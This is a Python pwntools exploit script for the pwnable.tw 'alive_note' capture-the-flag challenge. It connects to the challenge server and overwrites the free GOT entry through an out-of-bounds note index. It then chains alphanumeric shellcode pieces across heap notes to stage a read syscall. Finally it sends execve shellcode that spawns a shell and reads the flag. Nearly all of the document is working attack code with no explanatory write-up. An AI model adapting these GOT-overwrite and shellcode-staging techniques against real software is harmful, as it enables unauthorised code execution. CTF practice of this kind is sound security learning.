from pwn import *

# p = process('./alive_note')
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                     b *0x080488ea
#                                     continue
#                                     ''')
p = remote('chall.pwnable.tw', 10300)
elf = ELF('./alive_note')
puts_got = elf.got['puts']
printf_got = elf.got['printf']

free_got = elf.got['free']
note_addr = 0x0804A080
context.update(arch='i386')

def add_note(index, name):
    p.sendlineafter(" :", '1')
    p.sendlineafter(" :", str(index))
    p.sendafter(" :", name)

def show_name(index):
    p.sendlineafter(" :", '2')
    p.sendlineafter(" :", str(index))

def del_note(index):
    p.sendlineafter(" :", '3')
    p.sendlineafter(" :", str(index))

def isalnum(shellcode):
    return shellcode.isalnum()
# state pre shellcode
# eax = pointer to shellcode
# ebx = 0x0
# ecx = 0x0
# edx = 0x0
############################
# target
# eax = 0x3
# ebx = 0x0
# ecx = pointer to shellcode
# edx = count
# opcode of int 0x80: "\xcd\x80"
def solve():
    shellcode1 = asm('''
                    push eax
                    pop ecx                  # ecx = pointer to shellcode
                    push ebx
                    pop eax                  # eax = 0
                    push 0x70
                ''')
    shellcode1 += "\x75\x38"      # jne 

    print shellcode1
    print len(shellcode1)

    shellcode2 = asm('''
                    dec eax                  # al = 0xff
                    dec eax                  # al = 0xfe
                    dec eax                  # al = 0xfd
                    dec eax                  # al = 0xfc
                    dec eax                  # al = 0xfb
                    dec eax                  # al = 0xfa
                    ''')
    shellcode2 += "\x7a\x38"      # jne 
    print shellcode2
    print len(shellcode2)

    shellcode3 = asm('''
                    xor byte ptr[ecx + 0x46] , al
                    xor byte ptr[ecx + 0x47] , al           # int 0x80
                    ''')
    shellcode3 += "\x75\x38"      # jne 
    print shellcode3
    print len(shellcode3)

    shellcode4 = asm('''
                    pop edx                 # edx = 0x70
                    push 0x33
                    pop eax
                    xor al, 0x30
                    ''')
    shellcode4 += '\x37\x7a'
    # 0x37 ^ 0xfa = 0xcd
    # 0x7a ^ 0xfa = 0x80
    print shellcode4
    print len(shellcode4)


    offset = (free_got - note_addr)//4
    add_note(offset, shellcode1) 
    add_note(1, 'A'*8)
    add_note(1, 'A'*8)
    add_note(1, 'A'*8)
    add_note(1, shellcode2)
    add_note(2, 'A'*8)
    add_note(2, 'A'*8)
    add_note(2, 'A'*8)
    add_note(2, shellcode3)
    add_note(3, 'A'*8)
    add_note(3, 'A'*8)
    add_note(3, 'A'*8)
    add_note(3, shellcode4)
    del_note(2)             # when delete note 2, eax will store the address of latest note 2 in heap (0xXXXXXX48)
    getshell = asm('''
            push 0x68
            push 0x732f2f2f
            push 0x6e69622f
            mov ebx, esp
            xor ecx, ecx
            xor edx, edx
            mov al, 0xb
            int 0x80      
    ''')
    payload_getshell = 'A'*0x48 + getshell
    payload_getshell += 'A'*(0x70 - len(payload_getshell))            # shellcode read(0, 0xXXXXXXXX48, 0x70)
    p.sendline(payload_getshell)                                      # send shellcode getshell to overflow old shellcode
    p.sendline("cat /home/alive_note/flag")

    p.interactive()
if __name__ == '__main__':
    solve()